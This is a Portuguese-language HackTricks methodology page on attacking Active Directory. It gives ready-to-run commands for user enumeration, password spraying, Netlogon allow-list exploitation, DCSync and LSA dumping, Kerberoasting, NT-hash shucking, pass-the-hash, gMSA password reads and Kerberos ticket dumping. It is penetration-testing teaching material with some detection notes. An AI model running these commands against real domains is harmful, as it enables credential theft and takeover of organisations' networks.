# Metodologia do Active Directory

{{#include ../../banners/hacktricks-training.md}}

## Visão geral básica

O **Active Directory** é uma tecnologia fundamental que permite aos **administradores de rede** criar e gerenciar **domínios**, **usuários** e **objetos** em uma rede com eficiência. Ele foi projetado para ser escalável, facilitando a organização de um grande número de usuários em **grupos** e **subgrupos** gerenciáveis, enquanto controla os **direitos de acesso** em vários níveis.

A estrutura do **Active Directory** é composta por três camadas principais: **domínios**, **árvores** e **florestas**. Um **domínio** abrange uma coleção de objetos, como **usuários** ou **dispositivos**, que compartilham um banco de dados comum. **Árvores** são grupos desses domínios vinculados por uma estrutura compartilhada, e uma **floresta** representa a coleção de várias árvores interconectadas por **relações de confiança**, formando a camada mais alta da estrutura organizacional. **Direitos de acesso** e **comunicação** específicos podem ser definidos em cada um desses níveis.

Os principais conceitos do **Active Directory** incluem:

1. **Diretório** – Armazena todas as informações relacionadas aos objetos do Active Directory.
2. **Objeto** – Representa entidades no diretório, incluindo **usuários**, **grupos** ou **pastas compartilhadas**.
3. **Domínio** – Atua como um contêiner para objetos do diretório; vários domínios podem coexistir em uma **floresta**, cada um mantendo sua própria coleção de objetos.
4. **Árvore** – Um agrupamento de domínios que compartilham um domínio raiz.
5. **Floresta** – O nível mais alto da estrutura organizacional do Active Directory, composto por várias árvores com **relações de confiança** entre elas.

O **Active Directory Domain Services (AD DS)** abrange diversos serviços essenciais para o gerenciamento centralizado e a comunicação em uma rede. Esses serviços incluem:

1. **Serviços de Domínio** – Centralizam o armazenamento de dados e gerenciam as interações entre **usuários** e **domínios**, incluindo funcionalidades de **autenticação** e **pesquisa**.
2. **Serviços de Certificados** – Supervisionam a criação, distribuição e gerenciamento de **certificados digitais** seguros.
3. **Lightweight Directory Services** – Oferecem suporte a aplicativos habilitados para diretório por meio do **protocolo LDAP**.
4. **Directory Federation Services** – Fornecem recursos de **single sign-on** para autenticar usuários em vários aplicativos web durante uma única sessão.
5. **Gerenciamento de Direitos** – Ajuda a proteger material com direitos autorais, regulando sua distribuição e uso não autorizados.
6. **Serviço DNS** – Essencial para a resolução de **nomes de domínio**.

Para uma explicação mais detalhada, consulte: [**TechTerms - Definição de Active Directory**](https://techterms.com/definition/active_directory)

### **Autenticação Kerberos**

Para aprender a **atacar um AD**, você precisa **entender** muito bem o **processo de autenticação Kerberos**.\
[**Leia esta página se ainda não sabe como ele funciona.**](kerberos-authentication.md)

## Guia de consulta rápida

Você pode acessar [https://wadcoms.github.io/](https://wadcoms.github.io) para ver rapidamente quais comandos podem ser executados para enumerar/explorar um AD.

> [!WARNING]
> A comunicação Kerberos normalmente **exige um nome de domínio totalmente qualificado (FQDN)** para que o cliente possa obter um ticket para o SPN correto. Acessar uma máquina pelo endereço IP geralmente faz com que seja usado NTLM em vez de Kerberos.

## Reconhecimento do Active Directory (sem credenciais/sessões)

Se você tiver acesso a um ambiente AD, mas não tiver credenciais/sessões, poderá:

- **Fazer pentest da rede:**
  - Faça uma varredura na rede, encontre máquinas e portas abertas e tente **explorar vulnerabilidades** ou **extrair credenciais** delas (por exemplo, [impressoras podem ser alvos muito interessantes](ad-information-in-printers.md)).
  - Enumerar o DNS pode fornecer informações sobre servidores importantes no domínio, como web, impressoras, compartilhamentos, VPN, mídia etc.
    - `gobuster dns -d domain.local -t 25 -w /opt/Seclist/Discovery/DNS/subdomain-top2000.txt`
  - Consulte a [**Metodologia de pentest**](../../generic-methodologies-and-resources/pentesting-methodology.md) geral para obter mais informações sobre como fazer isso.
- **Verifique o acesso null e Guest nos serviços SMB** (isso não funcionará em versões modernas do Windows):
  - `enum4linux -a -u "" -p "" <DC IP> && enum4linux -a -u "guest" -p "" <DC IP>`
  - `smbmap -u "" -p "" -P 445 -H <DC IP> && smbmap -u "guest" -p "" -P 445 -H <DC IP>`
  - `smbclient -U '%' -L //<DC IP> && smbclient -U 'guest%' -L //`
  - Um guia mais detalhado sobre como enumerar um servidor SMB pode ser encontrado aqui:


{{#ref}}
../../network-services-pentesting/pentesting-smb/
{{#endref}}

- **Enumerar LDAP**
  - `nmap -n -sV --script "ldap* and not brute" -p 389 <DC IP>`
  - Um guia mais detalhado sobre como enumerar LDAP pode ser encontrado aqui (preste **atenção especial ao acesso anônimo**):


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

- **Envenenar a rede**
  - Obtenha credenciais [**personificando serviços com Responder**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)
  - Acesse o host [**abusando do relay attack**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)
  - Obtenha credenciais **expondo** [**serviços UPnP falsos com evil-S**](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md)[**SDP**](https://medium.com/@nickvangilder/exploiting-multifunction-printers-during-a-penetration-test-engagement-28d3840d8856)
- [**OSINT**](https://book.hacktricks.wiki/en/generic-methodologies-and-resources/external-recon-methodology/index.html):
  - Extraia nomes de usuário/nomes de documentos internos, redes sociais e serviços (principalmente web) nos ambientes do domínio, bem como de fontes publicamente disponíveis.
  - Se encontrar os nomes completos dos funcionários da empresa, você poderá testar diferentes **convenções de nomes de usuário** do AD (**[leia isto](https://activedirectorypro.com/active-directory-user-naming-convention/)**). As convenções mais comuns são: _NomeSobrenome_, _Nome.Sobrenome_, _NomSob_ (3 letras de cada), _Nom.Sob_, _NSobrenome_, _N.Sobrenome_, _SobrenomeNome_, _Sobrenome.Nome_, _SobrenomeN_, _Sobrenome.N_, 3 _letras aleatórias e 3 números aleatórios_ (abc123).
  - Ferramentas:
    - [w0Tx/generate-ad-username](https://github.com/w0Tx/generate-ad-username)
    - [urbanadventurer/username-anarchy](https://github.com/urbanadventurer/username-anarchy)

### Enumeração de usuários

- **Enumeração anônima de SMB/LDAP:** Consulte as páginas de [**pentest de SMB**](../../network-services-pentesting/pentesting-smb/index.html) e [**pentest de LDAP**](../../network-services-pentesting/pentesting-ldap.md).
- **Enumeração com Kerbrute**: Quando um **nome de usuário inválido é solicitado**, o servidor responde usando o código de **erro Kerberos** _KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN_, permitindo determinar que o nome de usuário é inválido. Para **nomes de usuário válidos**, o servidor retornará o **TGT em uma resposta AS-REP** ou o erro _KRB5KDC_ERR_PREAUTH_REQUIRED_, indicando que o usuário precisa realizar a pré-autenticação.
- **Sem autenticação com MS-NRPC**: Usando auth-level = 1 (sem autenticação) na interface MS-NRPC (Netlogon) dos controladores de domínio. Após vincular a interface MS-NRPC, o método chama a função `DsrGetDcNameEx2` para verificar se o usuário ou computador existe sem credenciais. A ferramenta [NauthNRPC](https://github.com/sud0Ru/NauthNRPC) implementa esse tipo de enumeração. A pesquisa pode ser encontrada [aqui](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf)<sup>[[11]](#references)</sup>

```bash
./kerbrute_linux_amd64 userenum -d lab.ropnop.com --dc 10.10.10.10 usernames.txt #From https://github.com/ropnop/kerbrute/releases

nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='DOMAIN'" <IP>
Nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='<domain>',userdb=/root/Desktop/usernames.txt <IP>

msf> use auxiliary/gather/kerberos_enumusers

crackmapexec smb dominio.es  -u '' -p '' --users | awk '{print $4}' | uniq
python3 nauth.py -t target -u users_file.txt #From https://github.com/sud0Ru/NauthNRPC
```

- **OWA (Outlook Web Access) Server**

Se você encontrar um desses servidores na rede, também poderá realizar **user enumeration contra ele**. Por exemplo, você poderia usar a ferramenta [**MailSniper**](https://github.com/dafthack/MailSniper):

```bash
ipmo C:\Tools\MailSniper\MailSniper.ps1
# Get info about the domain
Invoke-DomainHarvestOWA -ExchHostname [ip]
# Enumerate valid users from a list of potential usernames
Invoke-UsernameHarvestOWA -ExchHostname [ip] -Domain [domain] -UserList .\possible-usernames.txt -OutFile valid.txt
# Password spraying
Invoke-PasswordSprayOWA -ExchHostname [ip] -UserList .\valid.txt -Password Summer2021
# Get addresses list from the compromised mail
Get-GlobalAddressList -ExchHostname [ip] -UserName [domain]\[username] -Password Summer2021 -OutFile gal.txt
```

> [!WARNING]
> Você pode encontrar listas de nomes de usuário [**neste repositório do GitHub**](https://github.com/danielmiessler/SecLists/tree/master/Usernames/Names) e neste outro ([**statistically-likely-usernames**](https://github.com/insidetrust/statistically-likely-usernames)).
>
> No entanto, você deve ter os **nomes das pessoas que trabalham na empresa** a partir da etapa de recon que deveria ter realizado antes. Com o nome e o sobrenome, você pode usar o script [**namemash.py**](https://gist.github.com/superkojiman/11076951) para gerar possíveis nomes de usuário válidos.

### Abuso da allow-list de canais vulneráveis do Netlogon (Onelogon)

Mesmo após aplicar o patch do **Zerologon** no DC, contas explicitamente autorizadas ainda podem estar expostas ao **comportamento legado/vulnerável do canal seguro do Netlogon**. A configuração arriscada é a GPO **`Domain controller: Allow vulnerable Netlogon secure channel connections`** ou o valor correspondente no registro **`HKLM\SYSTEM\CurrentControlSet\Services\Netlogon\Parameters\VulnerableChannelAllowList`**.

Esse valor é um **descritor de segurança SDDL** (consulte [Security Descriptors](security-descriptors.md)). Qualquer conta ou grupo ao qual seja concedida a ACE relevante na DACL pode ser alvo. Por exemplo, `O:BAG:BAD:(A;;RC;;;WD)` efetivamente autoriza **Everyone**.

Fluxo de trabalho prático do operador:

1. **Identifique os principais autorizados** verificando tanto **SYSVOL/GPO** quanto o **registro do DC ativo**.
2. **Resolva os SIDs** encontrados no SDDL para identificar os usuários/computadores reais do AD e priorize **contas de máquina de DCs**, **contas de trust** e outras máquinas privilegiadas.
3. Tente repetidamente a **autenticação MS-NRPC / Netlogon** como a conta autorizada.
4. Após uma tentativa bem-sucedida, abuse da **definição de senha do Netlogon** para redefinir a senha da conta-alvo (o PoC público a define como uma string vazia).<sup>[[9]](#references)[[10]](#references)</sup>

Exemplos rápidos de triagem / laboratório do artefato público:

```bash
# Enumerate allow-listed accounts (scanner requires privileged registry access on the DC)
poetry run scan --dc-ip <DC_IP> --username <USER> --password <PASSWORD>

# Meet-in-the-middle attack against an allow-listed account
poetry run onelogon --dc-ip <DC_IP> --dc-name <DC_HOSTNAME> --username '<TARGET_ACCOUNT>'

# Faster 24-bit brute force when you control another computer account
poetry run onelogon --dc-ip <DC_IP> --dc-name <DC_HOSTNAME> --username '<TARGET_ACCOUNT>' \
  --comp-username '<COMP_ACCOUNT>' --comp-pass '<COMP_PASSWORD>'
```

Notes:

- O **scanner** é útil porque a allow-list efetiva pode estar em **SYSVOL**, no **registry** ou em ambos.
- O próprio caminho de exploit é importante porque **não exige privilégios de Domain Admin** depois que uma conta vulnerável é identificada.
- Comprometer uma **conta de máquina de Domain Controller**, como `DC$`, é especialmente perigoso, pois redefinir essa senha pode habilitar diretamente caminhos mais amplos para **AD takeover**.
- A viabilidade de **brute force** depende do modo: o artefato público descreve uma abordagem meet-in-the-middle, um **brute force de 24 bits** quando outra conta de computador está disponível e variantes mais lentas de **32 bits**.

Notas de detecção / hardening:

- Audite a política da allow-list e remova tudo, exceto exceções temporárias de compatibilidade explicitamente necessárias.
- Monitore os eventos **5827/5828/5829/5830/5831** do **System** nos DCs para detectar conexões Netlogon vulneráveis que foram negadas, identificadas ou explicitamente permitidas pela política.
- Trate as contas em `VulnerableChannelAllowList` como **de alto risco** até que a dependência legada seja removida.

### Conhecendo um ou vários nomes de usuário

Certo, então você sabe que já tem um nome de usuário válido, mas nenhuma senha... Então, tente:

- [**ASREPRoast**](asreproast.md): Se um usuário **não tiver** o atributo _DONT_REQ_PREAUTH_, você pode **solicitar uma mensagem AS_REP** para esse usuário, que conterá alguns dados criptografados com uma derivação da senha do usuário.
- [**Password Spraying**](password-spraying.md): Vamos tentar as **senhas mais comuns** com cada um dos usuários descobertos; talvez algum usuário esteja usando uma senha fraca (lembre-se da política de senhas!).
  - Observe que você também pode fazer **spraying em servidores OWA** para tentar acessar os servidores de e-mail dos usuários.


{{#ref}}
password-spraying.md
{{#endref}}

### LLMNR/NBT-NS Poisoning

Você pode conseguir **obter** alguns **hashes** de challenge para quebrar, fazendo **poisoning** de alguns protocolos da **rede**:


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

### NTLM Relay

A enumeração do Active Directory fornece nomes de usuário, identificadores de e-mail e padrões de nomenclatura, hosts candidatos e serviços que podem ser induzidos a autenticar. Use esse contexto para identificar [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack) de NTLM viáveis e possíveis caminhos para entrar no ambiente AD.

### Recon baseado em workspace do NetExec e verificações da postura de relay

- Use **workspaces do `nxcdb`** para manter o estado da recon de AD por engagement: `workspace create <name>` cria bancos de dados SQLite por protocolo em `~/.nxc/workspaces/<name>` (smb/mssql/winrm/ldap/etc). Alterne as visualizações com `proto smb|mssql|winrm` e liste os secrets coletados com `creds`. Apague manualmente os dados confidenciais ao terminar: `rm -rf ~/.nxc/workspaces/<name>`.<sup>[[6]](#references)</sup>
- A descoberta rápida de sub-redes com **`netexec smb <cidr>`** mostra **domínio**, **build do sistema operacional**, **requisitos de SMB signing** e **Null Auth**. Membros que exibem `(signing:False)` são **suscetíveis a relay**, enquanto os DCs geralmente exigem signing.
- Gere **nomes de host em /etc/hosts** diretamente da saída do NetExec para facilitar o targeting:

```bash
netexec smb 10.2.10.0/24 --generate-hosts-file hosts
cat hosts /etc/hosts | sponge /etc/hosts
```

- Quando o **SMB relay para o DC é bloqueado** pela assinatura, ainda verifique a postura do **LDAP**: `netexec ldap <dc>` destaca `(signing:None)` / channel binding fraco. Um DC com SMB signing obrigatório, mas LDAP signing desativado, continua sendo um alvo viável de **relay-to-LDAP** para abusos como **SPN-less RBCD**.

### Leaks de credenciais de impressoras no lado do cliente → validação em massa de credenciais do domínio

- Às vezes, as interfaces web de impressoras **incorporam senhas de administrador mascaradas no HTML**. Visualizar o código-fonte ou usar as ferramentas de desenvolvedor pode revelar o texto não criptografado (por exemplo, `<input value="<password>">`), permitindo acesso com Basic-auth a repositórios de digitalização/impressão.
- Os trabalhos de impressão recuperados podem conter **documentos de integração em texto não criptografado** com senhas por usuário. Mantenha os pares alinhados durante os testes:<sup>[[6]](#references)</sup>

```bash
cat IT_Procedures.txt | grep Username: | cut -d' ' -f2 > usernames
cat IT_Procedures.txt | grep Password: | cut -d' ' -f3 > passwords
netexec smb <dc> -u usernames -p passwords --no-bruteforce --continue-on-success
```

### Roubar Creds NTLM

Se você consegue **acessar outros PCs ou compartilhamentos** com o **usuário null ou guest**, pode **colocar arquivos** (como um arquivo SCF) que, se forem acessados de alguma forma, **disparem uma autenticação NTLM contra você** para que possa **roubar** o **desafio NTLM** e quebrá-lo:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### Hash Shucking & Ataques NT-Candidate

**Hash shucking** trata cada hash NT que você já possui como uma senha candidata para outros formatos mais lentos, cujo material de chave é derivado diretamente do hash NT. Em vez de fazer brute force de frases secretas longas em tickets Kerberos RC4, desafios NetNTLM ou credenciais em cache, você fornece os hashes NT aos modos NT-candidate do Hashcat e deixa que ele valide o reuso de senhas sem nunca descobrir o texto simples. Isso é especialmente eficaz após o comprometimento de um domínio, quando você pode coletar milhares de hashes NT atuais e históricos.<sup>[[5]](#references)</sup>

Use shucking quando:

- Você tem um conjunto de hashes NT obtido por DCSync, dumps de SAM/SECURITY ou cofres de credenciais e precisa testar se eles são reutilizados em outros domínios/florestas.
- Você captura material Kerberos baseado em RC4 (`$krb5tgs$23$`, `$krb5asrep$23$`), respostas NetNTLM ou blobs DCC/DCC2.
- Você quer comprovar rapidamente o reuso de frases secretas longas e impossíveis de quebrar e fazer pivot imediatamente via Pass-the-Hash.

A técnica **não funciona** contra tipos de criptografia cujas chaves não são o hash NT (por exemplo, Kerberos etype 17/18 AES). Se um domínio impõe o uso exclusivo de AES, você deve voltar aos modos regulares de senha.

#### Criar um conjunto de hashes NT

- **DCSync/NTDS** – Use `secretsdump.py` com o histórico para obter o maior conjunto possível de hashes NT (e seus valores anteriores):

  ```bash
  secretsdump.py <domain>/<user>@<dc_ip> -just-dc-ntlm -history -user-status -outputfile smoke_dump
  grep -i ':::' smoke_dump.ntds | awk -F: '{print $4}' | sort -u > nt_candidates.txt
  ```

  As entradas do histórico ampliam drasticamente o conjunto de candidatos, pois a Microsoft pode armazenar até 24 hashes anteriores por conta. Para ver mais maneiras de coletar segredos do NTDS, consulte:

{{#ref}}
dcsync.md
{{#endref}}

- **Dumps de cache de endpoints** – `nxc smb <ip> -u <local_admin> -p <password> --local-auth --lsa` (ou Mimikatz `lsadump::sam /patch`) extrai dados locais do SAM/SECURITY e logons de domínio em cache (DCC/DCC2). Remova duplicatas e acrescente esses hashes à mesma lista `nt_candidates.txt`.
- **Rastreie os metadados** – Mantenha o nome de usuário/domínio que gerou cada hash (mesmo que a wordlist contenha apenas hexadecimais). Os hashes correspondentes indicam imediatamente qual principal está reutilizando uma senha quando o Hashcat exibe o candidato correspondente.
- Prefira candidatos da mesma forest ou de uma forest confiável; isso maximiza a chance de correspondência durante o shucking.

#### Modos de candidatos NT do Hashcat

| Tipo de hash                             | Modo de senha | Modo de candidato NT |
| ---------------------------------------- | ------------- | ------------------- |
| Domain Cached Credentials (DCC)          | 1100          | 31500             |
| Domain Cached Credentials 2 (DCC2)       | 2100          | 31600             |
| NetNTLMv1 / NetNTLMv1+ESS                | 5500          | 27000             |
| NetNTLMv2                                | 5600          | 27100             |
| Kerberos 5 etype 23 AS-REQ Pre-Auth      | 7500          | _N/A_             |
| Kerberos 5 etype 23 TGS-REP (Kerberoast) | 13100         | 35300             |
| Kerberos 5 etype 23 AS-REP               | 18200         | 35400             |

Observações:

- As entradas de candidatos NT **devem permanecer como hashes NT brutos de 32 caracteres hexadecimais**. Desative os mecanismos de regras (sem `-r` ou modos híbridos), pois a transformação corrompe o material da chave candidata.
- Esses modos não são inerentemente mais rápidos, mas o keyspace NTLM (~30.000 MH/s em um M3 Max) é ~100× mais rápido que Kerberos RC4 (~300 MH/s). Testar uma lista NT selecionada é muito mais barato do que explorar todo o espaço de senhas no formato mais lento.
- Sempre use a **versão mais recente do Hashcat** (`git clone https://github.com/hashcat/hashcat && make install`), pois os modos 31500/31600/35300/35400 foram lançados recentemente.<sup>[[7]](#references)</sup>
- Atualmente, não há modo NT para AS-REQ Pre-Auth, e os etypes AES (19600/19700) exigem a senha em texto simples, pois suas chaves são derivadas por PBKDF2 de senhas em UTF-16LE, e não de hashes NT brutos.

#### Exemplo – Kerberoast RC4 (modo 35300)

1. Capture um TGS RC4 para um SPN alvo usando um usuário com poucos privilégios (consulte a página Kerberoast para obter detalhes):

{{#ref}}
kerberoast.md
{{#endref}}

   ```bash
   GetUserSPNs.py -dc-ip <dc_ip> -request <domain>/<user> -outputfile roastable_TGS
   ```

2. Extraia o ticket com sua lista NT:

   ```bash
   hashcat -m 35300 roastable_TGS nt_candidates.txt
   ```

   O Hashcat deriva a chave RC4 de cada candidato NT e valida o blob `$krb5tgs$23$...`. Uma correspondência confirma que a conta de serviço usa um dos seus hashes NT existentes.

3. Faça pivot imediatamente via PtH:

   ```bash
   nxc smb <dc_ip> -u roastable -H <matched_nt_hash>
   ```

   Opcionalmente, você pode recuperar o texto simples mais tarde com `hashcat -m 1000 <matched_hash> wordlists/`, se necessário.

#### Exemplo – Credenciais em cache (modo 31600)

1. Extraia os logons em cache de uma estação de trabalho comprometida:

   ```bash
   nxc smb <host_ip> -u localadmin -p '<password>' --local-auth --lsa > lsa_dump.txt
   ```

2. Copie a linha DCC2 do usuário interessante do domínio para `dcc2_highpriv.txt` e faça o shuck dela:

   ```bash
   hashcat -m 31600 dcc2_highpriv.txt nt_candidates.txt
   ```

3. Uma correspondência bem-sucedida revela o NT hash já conhecido na sua lista, provando que o usuário em cache está reutilizando uma senha. Use-o diretamente para PtH (`nxc smb <dc_ip> -u highpriv -H <hash>`) ou faça brute-force em modo NTLM rápido para recuperar a senha em texto.

O mesmo fluxo de trabalho se aplica a challenge-responses NetNTLM (`-m 27000/27100`) e DCC (`-m 31500`). Quando uma correspondência for identificada, você pode iniciar relay, PtH via SMB/WMI/WinRM ou tentar quebrar novamente o NT hash offline usando máscaras/regras.



## Enumerando o Active Directory COM credenciais/sessão

Nesta fase, você precisa ter **comprometido as credenciais ou uma sessão de uma conta de domínio válida.** Se você tiver credenciais válidas ou um shell como usuário de domínio, **lembre-se de que as opções apresentadas anteriormente ainda podem ser usadas para comprometer outros usuários**.

Antes de iniciar a enumeração autenticada, entenda o **problema do Kerberos double-hop**.


{{#ref}}
kerberos-double-hop-problem.md
{{#endref}}

### Enumeração

Comprometer uma conta é um **grande passo para avaliar o domínio**, pois permite a **enumeração autenticada do Active Directory**:

Em relação ao [**ASREPRoast**](asreproast.md), agora você pode encontrar todos os usuários possivelmente vulneráveis; e, no caso de [**Password Spraying**](password-spraying.md), pode obter uma **lista de todos os nomes de usuário** e testar a senha da conta comprometida, senhas vazias e novas senhas promissoras.

- Você pode usar o [**CMD para fazer um reconhecimento básico**](../basic-cmd-for-pentesters.md#domain-info)
- Você também pode usar o [**powershell para reconhecimento**](../basic-powershell-for-pentesters/index.html), que será mais furtivo
- Você também pode [**usar o powerview**](../basic-powershell-for-pentesters/powerview.md) para extrair informações mais detalhadas
- Outra ferramenta incrível para reconhecimento em um Active Directory é o [**BloodHound**](bloodhound.md). Ela **não é muito furtiva** (dependendo dos métodos de coleta usados), mas **se você não se importa** com isso, vale muito a pena experimentá-la. Descubra onde os usuários podem usar RDP, encontre caminhos para outros grupos etc.
  - **Outras ferramentas automatizadas de enumeração de AD são:** [**AD Explorer**](bloodhound.md#ad-explorer)**,** [**ADRecon**](bloodhound.md#adrecon)**,** [**Group3r**](bloodhound.md#group3r)**,** [**PingCastle**](bloodhound.md#pingcastle)**.**
- [**Registros DNS do AD**](ad-dns-records.md), pois podem conter informações interessantes.
- Uma **ferramenta com GUI** que você pode usar para enumerar o diretório é o **AdExplorer.exe**, do pacote **SysInternal** Suite.
- Você também pode pesquisar no banco de dados LDAP com **ldapsearch** para procurar credenciais nos campos _userPassword_ e _unixUserPassword_, ou até mesmo nas notas _description_ e _info_ do usuário. Um token sem rótulo em _info_ que pareça uma senha é apenas um candidato: confirme sua finalidade e validade separadamente, e não inclua o conteúdo das notas na saída da enumeração rotineira. Consulte [Password in AD User comment on PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#password-in-ad-user-comment) para outros métodos.
- Revise scripts **acessíveis** de logon de domínio e mapeamento de unidades em `\\<dc>\NETLOGON` ou `\\<dc>\SYSVOL\<domain>\scripts` quando a autorização permitir. A [documentação da Microsoft](https://learn.microsoft.com/en-us/troubleshoot/windows-server/active-directory/netlogon-share-not-present-after-install-ad-ds-on-full-read-only-domain-controller) descreve a função do diretório de scripts do compartilhamento NETLOGON. Primeiro liste os nomes e, em seguida, inspecione apenas os scripts relevantes e legíveis, dentro de um limite de tamanho; não despeje um compartilhamento inteiro nem exiba valores de credenciais durante a enumeração rotineira. Uma chamada do PowerShell a [`ConvertTo-SecureString -AsPlainText`](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/convertto-securestring) **não** protege uma senha literal armazenada no script. A chamada, por si só, não prova que um segredo esteja codificado no script: rastreie a entrada real e, em seguida, verifique separadamente a conta, a validade das credenciais e os privilégios. A análise de um script de domínio é uma revisão de compartilhamento remoto, separada da enumeração do host local.
- Se estiver usando **Linux**, você também pode enumerar o domínio com [**pywerview**](https://github.com/the-useless-one/pywerview).
- Você também pode experimentar ferramentas automatizadas, como:
  - [**tomcarver16/ADSearch**](https://github.com/tomcarver16/ADSearch)
  - [**61106960/adPEAS**](https://github.com/61106960/adPEAS)
- **Extraindo todos os usuários do domínio**

  É muito fácil obter todos os nomes de usuário do domínio no Windows (`net user /domain` ,`Get-DomainUser` ou `wmic useraccount get name,sid`). No Linux, você pode usar: `GetADUsers.py -all -dc-ip 10.10.10.110 domain.com/username` ou `enum4linux -a -u "user" -p "password" <DC IP>`

> Mesmo que esta seção de enumeração pareça pequena, ela é a parte mais importante de todas. Acesse os links (principalmente os de cmd, powershell, powerview e BloodHound), aprenda a enumerar um domínio e pratique até se sentir à vontade. Durante uma avaliação, este será o momento decisivo para encontrar um caminho até DA ou concluir que nada pode ser feito.

### Contas de computador pré-criadas previsíveis -> acesso a senhas de gMSA

Contas de computador preparadas para associações legadas podem manter uma senha inicial previsível. O módulo `pre2k` do NetExec identifica o valor característico `userAccountControl` `4128` (`WORKSTATION_TRUST_ACCOUNT | PASSWD_NOTREQD`) e tenta obter um TGT Kerberos usando os primeiros 14 caracteres do nome do computador em minúsculas, sem o `$` final. Trate esse valor de UAC como um seletor de candidatos, em vez de presumir que a participação em **Pre-Windows 2000 Compatible Access**, por si só, prova que a senha é fraca.<sup>[[18]](#references)[[20]](#references)</sup>

Use a enumeração LDAP autenticada para testar os candidatos e salvar os TGTs obtidos com sucesso. `ALL=True` amplia os testes para incluir objetos que não correspondem ao filtro padrão `4128`.<sup>[[18]](#references)</sup>

```bash
netexec ldap dc.corp.local -u auditor -p 'Password!' -M pre2k
netexec ldap dc.corp.local -u auditor -p 'Password!' -M pre2k -o ALL=True

# Validate a candidate explicitly with Kerberos
netexec ldap dc.corp.local -u 'APP01$' -p app01 -k
```

Uma falha no bind padrão/NTLM **não** invalida essa constatação: teste com `-k`, um FQDN que resolva para o DC e um relógio sincronizado com o KDC. Execuções bem-sucedidas do módulo gravam listas de candidatos e ccaches obtidos em `~/.nxc/modules/pre2k/`.<sup>[[18]](#references)[[20]](#references)</sup>

Após comprometer o principal de computador, mapeie suas associações a grupos aninhados e seus direitos de saída. Em particular, os principais listados no descritor de segurança `msDS-GroupMSAMembership` de um gMSA podem ler `msDS-ManagedPassword`; a saída `--gmsa` do NetExec mostra os principais autorizados e retorna o hash NT atual quando o computador autenticador está autorizado.<sup>[[19]](#references)[[20]](#references)</sup>

```bash
# Enumerate gMSAs and their password readers with the initial user
netexec ldap dc.corp.local -u auditor -p 'Password!' --gmsa

# Re-query as the compromised computer through Kerberos
netexec ldap dc.corp.local -u 'APP01$' -p app01 -k --gmsa
```

Então avalie a gMSA recuperada como qualquer outra credencial: inspecione a associação a grupos locais/de domínio, os direitos de logon, os SPNs, a delegação e os serviços acessíveis antes de tentar pass-the-hash. Esse caminho de recuperação baseado em ACL é distinto de [Golden gMSA/dMSA](golden-dmsa-gmsa.md), que deriva senhas gerenciadas após o comprometimento da chave raiz do KDS.<sup>[[20]](#references)</sup>

Um principal de computador também pode ter controle de saída sobre outros objetos de computador ou grupos. Depois de obter um, inspecione separadamente suas associações aninhadas e ACLs efetivas: um direito de escrita em outro objeto de computador pode permitir uma alteração de conta, e direitos de associação a grupos podem levar a uma função de logon. Uma flag de conta preparada, uma convenção de nomenclatura previsível ou, por si só, uma relação `GenericWrite` não comprovam o caminho completo.

Uma cópia legível de um blob `msDS-ManagedPassword` em um arquivo, compartilhamento ou backup representa um caminho de exposição separado: a ACL de leitura LDAP não protege uma cópia armazenada em outro lugar. Valide se os dados são um blob de senha gerenciada antes de interpretá-los e diferencie isso tanto de uma leitura LDAP autorizada quanto da derivação a partir da chave raiz do KDS.

### Kerberoast

Kerberoasting envolve obter **tickets TGS** usados por serviços vinculados a contas de usuário e quebrar a criptografia — baseada em senhas de usuário — **offline**.

Saiba mais sobre isso em:


{{#ref}}
kerberoast.md
{{#endref}}

### Conexão remota (RDP, SSH, FTP, Win-RM etc.)

Depois de obter algumas credenciais, você pode verificar se tem acesso a alguma **máquina**. Para isso, você pode usar o **CrackMapExec** para tentar se conectar a vários servidores com diferentes protocolos, de acordo com suas varreduras de portas.

### Escalonamento de privilégios local

Se você comprometeu credenciais ou uma sessão como usuário comum do domínio e consegue acessar **qualquer máquina do domínio**, procure um caminho para **escalar privilégios localmente e coletar credenciais**. Privilégios de administrador local podem permitir **extrair hashes de outros usuários** da memória (LSASS) e do armazenamento local (SAM).

Este livro tem uma página completa sobre [**escalonamento de privilégios local no Windows**](../windows-local-privilege-escalation/index.html) e uma [**checklist**](../checklist-windows-privilege-escalation.md). Além disso, não se esqueça de usar o [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite).

### Tickets da sessão atual

É muito **improvável** que você encontre **tickets** no usuário atual que **lhe deem permissão para acessar** recursos inesperados, mas você pode verificar:

```bash
## List all tickets (if not admin, only current user tickets)
.\Rubeus.exe triage
## Dump the interesting one by luid
.\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
[IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("<BASE64_TICKET>"))
```

### NTLM Relay

Com credenciais de domínio ou uma sessão de usuário, revisite os [**ataques de relay**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack) NTLM: técnicas de enumeração autenticada e coerção podem revelar caminhos de relay que não estavam disponíveis durante o reconhecimento não autenticado.

### Procura por Credenciais em Compartilhamentos de Computadores | Compartilhamentos SMB

Agora que você tem algumas credenciais básicas, deve verificar se consegue **encontrar** algum **arquivo interessante compartilhado no AD**. Você poderia fazer isso manualmente, mas é uma tarefa muito entediante e repetitiva (ainda mais se encontrar centenas de documentos para verificar).

